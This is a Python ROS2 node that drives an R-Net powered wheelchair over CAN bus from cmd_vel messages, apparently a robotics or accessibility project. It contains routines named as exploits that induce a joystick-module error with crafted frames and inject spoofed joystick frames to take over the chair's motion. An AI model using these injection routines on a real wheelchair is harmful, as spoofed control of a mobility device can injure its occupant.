# Copyright 2016 Open Source Robotics Foundation, Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import rclpy
from rclpy.node import Node

import socket, sys, os, array, threading
from time import *
from fcntl import ioctl
from .import can2RNET as can2RNET

from geometry_msgs.msg import Twist


class RnetTwistSubscriber(Node):

    def __init__(self):
        super().__init__('minimal_subscriber')
        self.subscription = self.create_subscription(
            Twist,
            'cmd_vel',
            self.listener_callback,
            10)
        self.subscription  # prevent unused variable warning

    def listener_callback(self, msg):
        self.get_logger().info('I heard: "%f"' % int(msg.linear.x * 10000))
        global joystick_x
        global joystick_y
        global rnet_threads_running

        joystick_x = 0x100 + int(msg.linear.x * 10000) >> 8 &0xFF
        joystick_y = 0x100 - int(msg.angular.z * 10000) >> 8 &0xFF
        print('X: '+dec2hex(joystick_x,2)+'\tY: '+dec2hex(joystick_y,2)+ '\tThreads: '+str(threading.active_count()))

def dec2hex(dec,hexlen):  #convert dec to hex with leading 0s and no '0x'
    h=hex(int(dec))[2:]
    l=len(h)
    if h[l-1]=="L":
        l-=1  #strip the 'L' that python int sticks on
    if h[l-2]=="x":
        h= '0'+hex(int(dec))[1:]
    return ('0'*hexlen+h)[l:l+hexlen]

def induce_JSM_error(cansocket):
    for i in range(0,3):
        can2RNET.cansend(cansocket,'0c000000#')

def RNET_JSMerror_exploit(cansocket):
    print("Waiting for JSM heartbeat")
    can2RNET.canwait(cansocket,"03C30F0F:1FFFFFFF")
    t=time()+0.20

    print("Waiting for joy frame")
    joy_id = wait_rnet_joystick_frame(cansocket,t)
    print("Using joy frame: "+joy_id)

    induce_JSM_error(cansocket)
    print("3 x 0c000000# sent")

    return(joy_id)

#THREAD: sends RnetJoyFrame every mintime seconds
def send_joystick_canframe(s,joy_id):
    mintime = .01
    nexttime = time() + mintime
    priorjoystick_x=joystick_x
    priorjoystick_y=joystick_y
    while rnet_threads_running:
        # joyframe = joy_id+'#'+dec2hex(joystick_x,2)+dec2hex(joystick_y,2)
        # cansend(s,joyframe)
        print("Im sending joy stick frames")
        print('X: '+dec2hex(joystick_x,2)+'\tY: '+dec2hex(joystick_y,2)+ '\tThreads: '+str(threading.active_count()))
        nexttime += mintime
        t= time()
        if t < nexttime:
            sleep(nexttime - t)
        else:
            nexttime += mintime

#THREAD: Waits for joyframe and injects another spoofed frame ASAP
def inject_rnet_joystick_frame(can_socket, rnet_joystick_id):
	rnet_joystick_frame_raw = can2RNET.build_frame(rnet_joystick_id + "#0000") #prebuild the frame we are waiting on
	while rnet_threads_running:
		cf, addr = can_socket.recvfrom(16)
		if cf == rnet_joystick_frame_raw:
			can2RNET.cansend(can_socket, rnet_joystick_id + '#' + dec2hex(joystick_x, 2) + dec2hex(joystick_y, 2))


#Waits for any frame containing a Joystick position
#Returns: JoyFrame extendedID as text
def wait_rnet_joystick_frame(can_socket, start_time):
    frameid = ''

    while frameid[0:3] != '020':  #just look for joystick frame ID (no extended frame)
        cf, addr = can_socket.recvfrom(16) #this is a blocking read.... so if there is no canbus traffic it will sit forever (to fix!)
        candump_frame = can2RNET.dissect_frame(cf)
        frameid = candump_frame.split('#')[0]
        if time() > start_time:
             print("JoyFrame wait timed out ")
             return('Err!')
    return(frameid)

#Set speed_range: 0% - 100%
def RNETsetSpeedRange(cansocket,speed_range):
    if speed_range>=0 and speed_range<=0x64:
        can2RNET.cansend(cansocket,'0a040100#'+dec2hex(speed_range,2))
    else:
        print('Invalid RNET SpeedRange: ' + str(speed_range))

def RNETshortBeep(cansocket):
    can2RNET.cansend(cansocket,"181c0100#0260000000000000")

#Play little song
def RNETplaysong(cansocket):
    can2RNET.cansend(cansocket,"181C0100#2056080010560858")
    sleep(.77)
    can2RNET.cansend(cansocket,"181C0100#105a205b00000000")

#do very little and output something as sign-of-life
def watch_and_wait():
    started_time = time()
    while threading.active_count() > 0 and rnet_threads_running:
        sleep(0.5)
        print(str(round(time()-started_time,2))+'\tX: '+dec2hex(joystick_x,2)+'\tY: '+dec2hex(joystick_y,2)+ '\tThreads: '+str(threading.active_count()))

#does not use a thread queue.  Instead just sets a global flag.
def kill_rnet_threads():
    global rnet_threads_running
    rnet_threads_running = False

# Makes sure that gamepad is centered.
def check_usb_gamepad_center():
    print('waiting for joystick to be centered')
    while (joystick_x !=0 or joystick_y !=0):
        print('joystick not centered')

def selectControlExploit(can_socket):
    user_selection = int(input("Select exploit to use: \n \n 1. Disable R-Net Joystick temporary. (Allows for better control) \n 2. Allow R-Net Joystick (Will see some lag, but is more safe.)\n 3. ROS2 R-Net Joystick. (Allows for the bettest control) \n"))


    if (user_selection == 1 or user_selection == 3):
        print("\n You chose to disable the R-Net Joystick temporary. Restart the chair to fix. ")
        start_time = time() + .20
        # print('Waiting for RNET-Joystick frame')

        # rnet_joystick_id = wait_rnet_joystick_frame(can_socket, start_time) #t=timeout time
        # if rnet_joystick_id == 'Err!':
        #     print('No RNET-Joystick frame seen within minimum time')
        #     sys.exit()
        # print('Found RNET-Joystick frame: ' + rnet_joystick_id)

        # # set chair's speed to the lowest setting.
        # chair_speed_range = 00
        # RNETsetSpeedRange(can_socket, chair_speed_range)

        rnet_joystick_id = '020' # RNET_JSMerror_exploit(can_socket)

        sendjoyframethread = threading.Thread(
            target=send_joystick_canframe,
            args=(can_socket,rnet_joystick_id,),
            daemon=True)
        sendjoyframethread.start()
    elif (user_selection == 2):
        print("\n You chose to allow the R-Net Joystick.")
        start_time = time() + .20
        print('Waiting for RNET-Joystick frame')

        rnet_joystick_id = wait_rnet_joystick_frame(can_socket, start_time) #t=timeout time
        if rnet_joystick_id == 'Err!':
            print('No RNET-Joystick frame seen within minimum time')
            sys.exit()
        print('Found RNET-Joystick frame: ' + rnet_joystick_id)


        # set chair's speed to the lowest setting.
        chair_speed_range = 00
        RNETsetSpeedRange(can_socket, chair_speed_range)


        inject_rnet_joystick_frame_thread = threading.Thread(
            target=inject_rnet_joystick_frame,
            args=(can_socket, rnet_joystick_id,),
            daemon=True)
        inject_rnet_joystick_frame_thread.start()

def main(args=None):
    rclpy.init(args=args)

    minimal_subscriber = RnetTwistSubscriber()

    global rnet_threads_running
    global joystick_x
    global joystick_y
    rnet_threads_running = True
    can_socket = can2RNET.opencansocket(0)

    joystick_x = 0
    joystick_y = 0

    # selectControlExploit(can_socket)
    # sleep(0.5)
    rclpy.spin(minimal_subscriber)

    # Destroy the node explicitly
    # (optional - otherwise it will be done automatically
    # when the garbage collector destroys the node object)
    minimal_subscriber.destroy_node()
    rclpy.shutdown()


if __name__ == '__main__':
    main()
